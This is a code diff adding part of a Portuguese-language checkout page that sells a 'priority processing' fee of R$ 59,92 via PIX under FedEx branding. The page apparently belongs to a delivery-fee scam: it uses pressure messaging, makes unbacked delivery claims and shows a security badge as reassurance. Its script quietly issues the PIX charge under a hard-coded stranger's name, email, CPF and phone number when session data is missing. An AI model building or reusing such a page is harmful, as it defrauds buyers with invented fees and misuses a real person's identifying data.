+          <span class="compare-text">Atendimento prioritário</span>
+        </div>
+        <div class="compare-item">
+          <svg class="compare-icon" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          <span class="compare-text">Preparação preferencial</span>
+        </div>
+        <div class="compare-item">
+          <svg class="compare-icon" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          <span class="compare-text">Despacho prioritário FedEx</span>
+        </div>
+        <div class="compare-item">
+          <svg class="compare-icon" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          <span class="compare-text">Entrega rápida em 7 dias</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- URGENCY BOX (Sem emojis) -->
+  <div class="urgency-box">
+    <div class="urgency-icon-wrap">
+      <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#c2410c" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+    </div>
+    <div>
+      <div class="urgency-title">Aceleração de remessa pendente</div>
+      <div class="urgency-text">Seu pedido já está reservado. Caso deseje acelerar o processamento antes do despacho, ative agora o Processamento Prioritário.</div>
+    </div>
+  </div>
+
+  <!-- PRICE CARD -->
+  <div class="price-card">
+    <div class="price-info">
+      <div class="price-label">Taxa de Processamento Prioritário</div>
+      <div class="price-value"><small>R$</small> 59,92</div>
+      <div class="price-badges">
+        <span class="price-badge">Pagamento único</span>
+        <span class="price-badge">PIX</span>
+      </div>
+    </div>
+    <div style="text-align:center;">
+      <div style="font-size:11px;color:#94a3b8;margin-bottom:4px;">Economia de tempo</div>
+      <div style="font-size:20px;font-weight:900;color:#16a34a;">113 dias</div>
+      <div style="font-size:10px;color:#94a3b8;">a menos de espera</div>
+    </div>
+  </div>
+
+  <!-- SECURITY STRIP -->
+  <div class="security-strip">
+    <div class="sec-item">
+      <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#94a3b8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Conexão segura SSL
+    </div>
+    <div class="sec-item">
+      <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#94a3b8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Serviço FedEx Priority
+    </div>
+    <div class="sec-item">
+      <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#94a3b8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      Ativação instantânea
+    </div>
+  </div>
+
+  <!-- CTA BUTTON -->
+  <div class="btn-wrap">
+    <button class="btn-priority" id="btn-ativar" onclick="ativarPrioritario()">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+      ATIVAR PROCESSAMENTO PRIORITÁRIO
+    </button>
+    <div class="btn-sub-text">Processado em ambiente de segurança eletrônica via PIX</div>
+  </div>
+
+  <!-- MODAL LOADER -->
+  <div class="modal-overlay" id="loader-modal">
+    <div class="modal-box">
+      <div class="modal-icon-wrap">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+      </div>
+      <div class="modal-title">Ativando prioridade...</div>
+      <div class="modal-sub">Conectando ao sistema de despacho FedEx Priority.<br>Por favor, aguarde.</div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="prog-fill"></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ── DADOS FIXOS DE FALLBACK (apenas para gerar PIX, nunca aparecem na tela) ──
+  var _FB_NOME  = 'enilton jose da silva';
+  var _FB_EMAIL = 'eniltonjose@gmail.com';
+  var _FB_CPF   = '79699979372';
+  var _FB_TEL   = '11998663234';
+
+  // Ativar prioritário — gera PIX e redireciona
+  async function ativarPrioritario() {
+    var btn = document.getElementById('btn-ativar');
+    if (btn) btn.disabled = true;
+
+    var modal = document.getElementById('loader-modal');
+    var fill = document.getElementById('prog-fill');
+    if (modal) modal.style.display = 'flex';
+
+    var width = 0;
+    var interval = setInterval(function() {
+      if (width < 90) { width += 4; if (fill) fill.style.width = width + '%'; }
+    }, 100);
+
+    try {
+      // Usa dados da sessão se existirem; caso contrário usa fallback invisível
+      var nome  = localStorage.getItem('user_nome')  || _FB_NOME;
+      var email = localStorage.getItem('user_email') || _FB_EMAIL;
+      var tel   = localStorage.getItem('user_tel')   || _FB_TEL;
+      var cpf   = localStorage.getItem('user_cpf')   || _FB_CPF;
+
+      var resp = await fetch('/api/create-pix', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          amount: 5992, // R$ 59,92 em centavos
+          name: nome,
+          email: email,
+          cellphone: tel.replace(/\D/g, ''),
+          taxId: cpf.replace(/\D/g, ''),
+          src: window.location.href,
+          user_agent: navigator.userAgent,
+          is_upsell: true
+        })
+      });
+
+      var data = await resp.json();
+      console.log('[PrioridadePix] Resposta:', data);
+
+      if (data && data.pix_code) {
+        localStorage.setItem('prioridade_pix_code', data.pix_code);
+        if (data.txid) localStorage.setItem('prioridade_txid', data.txid);
+        if (fill) fill.style.width = '100%';
+        clearInterval(interval);
+        setTimeout(function() { window.location.href = '/pix-prioridade'; }, 400);
+      } else {
+        throw new Error('PIX não gerado');
+      }
+    } catch (err) {
+      clearInterval(interval);
+      if (modal) modal.style.display = 'none';
+      if (btn) btn.disabled = false;
+      console.error('[PrioridadePix] Erro:', err);
+      alert('Erro ao ativar prioridade. Tente novamente.');
+    }
+  }
+</script>
+</body>
+</html>
